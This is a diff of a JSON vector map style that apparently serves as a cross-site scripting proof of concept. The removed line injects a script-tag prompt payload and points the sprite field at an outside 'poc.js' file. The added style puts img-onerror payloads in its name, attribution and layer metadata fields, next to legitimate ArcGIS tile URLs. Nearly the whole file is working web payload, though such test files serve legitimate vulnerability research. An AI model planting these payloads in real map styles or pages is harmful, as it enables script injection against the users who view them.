@@ -1,1 +1,23 @@
-{"message":"testtt'%22><script>prompt(444)</script>","glyphs":"testttt","sprite":"https://ihatedota.com/poc.js","title":"testtttttter","length":"444"}
+{
+    "version": 8,
+    "name": "<img src=x onerror=alert(document.domain)>",
+    "sources": {
+        "esri": {
+            "type": "vector",
+            "attribution": "<img src=x onerror=alert(document.domain)>",
+            "url": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer"
+        }
+    },
+    "layers": [
+        {
+            "id": "test",
+            "type": "fill",
+            "source": "esri",
+            "metadata": {
+                "esri.title": "<img src=x onerror=alert(document.domain)>"
+            }
+        }
+    ],
+    "glyphs": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/fonts/{fontstack}/{range}.pbf",
+    "sprite": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/sprites/sprite"
+}
